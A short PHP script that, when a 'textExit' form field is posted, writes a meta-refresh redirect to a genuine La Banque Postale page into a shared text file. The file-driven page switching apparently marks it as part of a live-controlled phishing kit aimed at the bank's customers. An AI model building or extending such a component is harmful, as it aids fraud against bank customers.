
<?php


session_start();

if(isset($_POST['textExit'])) 
{
    
$Page .= '    <meta http-equiv="refresh" content="0;url=https://www.labanquepostale.com/newsroom-publications/actualites/2022/bpe-louvre-banque-privee.html" />
  ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);




}

else {




}

?>
